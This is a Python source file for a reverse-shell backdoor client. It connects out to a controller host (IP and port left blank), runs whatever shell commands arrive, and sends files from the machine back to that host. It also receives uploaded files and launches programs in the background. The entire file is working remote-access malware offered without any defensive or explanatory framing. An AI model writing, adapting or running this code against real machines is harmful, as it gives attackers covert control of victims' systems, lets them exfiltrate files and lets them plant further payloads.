#!/usr/bin/env python

import socket
import subprocess as sub
import json
import os
import base64
import threading

HOST_IP = ""
PORT = ""

class RunThread(threading.Thread):
	def run(self):
		sub.run(coml[1:])


def ex_command(com):
	return sub.check_output(com,shell=True)

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect((HOST_IP,PORT))

while True:
	try:
		com = connection.recv(1024)
		comj = json.loads(com)
		if "cd" in comj and len(comj) > 3:
			coml = comj.split(" ")
			os.chdir(coml[1])
			result = f"[+] Changing pwd to {coml[1]}"
			resultj = json.dumps(result)
			connection.send(resultj.encode("utf-8"))
		elif "exit" == comj:
			connection.close()
			os._exit()

		elif "download" in comj:
			coml = comj.split(" ")
			with open(coml[1],"rb") as f:
				result = base64.b64encode(f.read())
				resultj = json.dumps(result.decode("utf-8"))
				connection.send(resultj.encode("utf-8"))
		elif "upload" in comj:
			result = "".encode("utf-8")
			while True:
				try:
					result = result + connection.recv(1028)
					resultj = json.loads(result)
					coml = comj.split(" ")
					resultj = base64.b64decode(resultj)
					with open(coml[1],"wb") as f:
						f.write(resultj)
					result1 = f"[+] Upload Complete"
					resultj1 = json.dumps(result1)
					connection.send(resultj1.encode("utf-8"))
					break
				except:
					continue
		elif "run" in comj:
			coml = comj.split(" ")
			run = RunThread()
			run.daemon = True
			run.start()
			result = f"[+] Program Executed"
			resultj = json.dumps(result)
			connection.send(resultj.encode("utf-8"))
		else:
			com_results = ex_command(comj)
			com_resultsj = json.dumps(str(com_results.decode("utf-8")))
			connection.send(com_resultsj.encode("utf-8"))
	except Exception as e:
		connection.close()
		exit()



connection.close()
